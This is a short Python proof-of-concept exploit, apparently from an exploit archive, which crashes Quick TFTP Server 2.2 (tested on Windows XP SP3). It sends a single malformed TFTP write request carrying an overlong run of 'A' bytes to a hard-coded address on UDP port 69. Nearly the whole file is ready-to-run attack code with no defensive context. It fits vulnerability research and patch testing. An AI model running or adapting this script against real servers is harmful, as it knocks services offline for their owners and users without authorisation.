#!/usr/bin/python
  
#Exploit Title: Quick TFTP Server 2.2 DoS
#Date: 6th June 2013
#Exploit Author: npn
#Exploit Author Homepage: http://www.iodigitalsec.com/
#Exploit Author Write Up: http://www.iodigitalsec.com/blog/fuzz-to-denial-of-service-quick-tftp-server-2-2/
#Vendor Homepage: http://www.tallsoft.com/tftpserver.htm
#Software Link: http://www.tallsoft.com/tftpserver_setup.exe
#Version: 2.2
#Tested on: Windows XP SP3 English
 
from socket import *
import sys
import select
 
pwn = "\x00\x02"
pwn += "\x66\x69\x6c\x65\x2e\x74\x78\x74\x00"
pwn += "A"*1200
pwn += "\x00"
 
address = ('192.168.200.20', 69)
server_socket = socket(AF_INET, SOCK_DGRAM)
 
server_socket.sendto(pwn, address)
